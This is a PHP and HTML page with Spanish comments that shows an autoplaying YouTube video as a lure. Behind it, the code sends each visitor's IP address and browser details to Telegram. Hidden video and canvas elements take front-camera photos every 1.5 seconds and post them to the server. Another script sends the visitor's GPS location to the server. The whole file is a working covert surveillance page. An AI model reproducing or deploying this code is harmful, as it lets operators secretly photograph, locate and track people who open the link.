<?php
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

// Registrar visita
$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('c');

$msg = "👋 <b>Nueva visita</b>\n".
       "📌 IP: $ip\n".
       "🖥️ UA: $ua\n".
       "⏰ Hora: $ts";
send_to_telegram($msg);
?>

<!doctype html>
<html>
<head>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>
<body>

<!-- Video de YouTube -->
<iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<!-- Video y Canvas ocultos para tomar fotos -->
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
'use strict';

// Función para enviar foto al servidor
function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'post.php',
        dataType: 'json',
        async: false
    });
}

// Configuración cámara
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio: false, video: { facingMode: "user" } };

// Acceso a la cámara
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        capturePhotoLoop();
    } catch (e) {
        console.error('Error al acceder a la cámara:', e);
    }
}

// Captura fotos cada 1.5 segundos
function capturePhotoLoop() {
    const context = canvas.getContext('2d');
    setInterval(function(){
        context.drawImage(video, 0, 0, 640, 480);
        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
    }, 1500);
}

// Iniciar cámara oculta
initCamera();

// Obtener ubicación y enviarla automáticamente
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        const { latitude, longitude, accuracy } = pos.coords;
        fetch('location.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude, accuracy })
        });
    });
}
</script>

</body>
</html>
